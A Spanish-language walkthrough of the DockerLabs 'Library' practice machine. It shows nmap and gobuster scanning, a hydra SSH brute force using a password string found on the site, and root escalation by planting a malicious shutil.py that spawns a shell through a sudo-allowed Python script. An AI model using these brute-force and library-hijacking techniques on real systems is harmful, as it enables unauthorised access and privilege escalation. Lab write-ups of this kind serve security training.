# Máquina Library

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

En el puerto 80 nos encontramos con la página por defecto de **apache**.
Aplicamos **Fuzzing** con **gobuster**:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php.bak
-------------------------------------------------------------------------
/index.php            (Status: 200) [Size: 26]
/index.html           (Status: 200) [Size: 10671]
/javascript           (Status: 301) [Size: 313]
/server-status        (Status: 403) [Size: 275] 
```

Encontramos un **index.php** un poco extraño que nos proporciona una cadena de caracteres:

![Pasted image 20240512222036](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/71132b41-7738-4d9b-a760-32a6ed11e477)

```
JIFGHDS87GYDFIGD
```

--------------
## Explotación

Aplicamos fuerza bruta con **hydra**. Para una lista de usuarios, probaremos la cadena anterior como contraseña de estos usuarios:

```shell
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -t 4 -I
----------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
```

Nos conectamos con el user **carlos**:

```shell
ssh carlos@172.17.0.2
```

Estamos dentro !

------------------------------
## Escalada de privilegios

```shell
sudo -l
--------------------
User carlos may run the following commands on 415aa702590c:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

![Pasted image 20240512223354](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/9a2b18cc-31df-47b7-8315-d755fad04535)

Vemos que podemos ejecutar un script de **python** como el usuario **root** que está utilizando la librería **shutil** sobre la que posiblemente podamos aplicar un **Library Path Hijacking**:
Creamos en el directorio **opt** una librería maliciosa para que el script vaya a buscar nuestra librería falsa antes que la original.

```shell
touch shutil.py
```

Contenido de **shutil.py**:

```python
import os
os.system("bash")
```

Ejecutamos el script:

```shell
sudo /usr/bin/python3 /opt/script.py
```

```shell
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximos en el sistema !
